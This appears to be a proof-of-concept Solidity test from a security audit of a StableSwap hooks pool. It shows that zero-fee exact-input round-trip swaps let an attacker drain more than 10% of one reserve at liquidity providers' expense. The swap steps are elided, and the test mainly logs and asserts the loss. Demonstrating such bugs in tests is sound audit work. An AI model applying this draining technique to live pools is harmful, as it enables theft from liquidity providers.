...
contract ZeroFeeExactInputRoundTripTest is ExternalContractsDeployer {
    using SafeERC20 for IERC20;

    uint256 internal constant ZERO_LP_FEE = 0;
    ...
    function setUp() public override {
        ...
        (, bytes32 salt) = factory.mineSalt(currencies, rateOracles, ZERO_LP_FEE, BASE_AMP, code);
        hooks = StableSwapHooks(factory.deploy(currencies, rateOracles, ZERO_LP_FEE, BASE_AMP, salt, code));
    ...
    function test_zeroFeeExactInputRoundTripExtractsPoolReserves() public {
        ...
        uint256 profit = token1.balanceOf(address(attacker)) - attackerBefore;
        uint256 reserve0After = hooks.reserves(0);
        uint256 reserve1After = hooks.reserves(1);

        emit log_named_uint("attacker profit in token1", profit);
        emit log_named_uint("reserve0 before", reserve0Before);
        emit log_named_uint("reserve0 after", reserve0After);
        emit log_named_uint("reserve1 before", reserve1Before);
        emit log_named_uint("reserve1 after", reserve1After);

        assertGt(profit, RESERVE / 10, "round trip should extract >10% of one reserve");
        assertEq(reserve0After, reserve0Before, "round trip restores the intermediate token reserve");
        assertEq(reserve1Before - reserve1After, profit, "LP reserve loss equals attacker profit");
    }
}
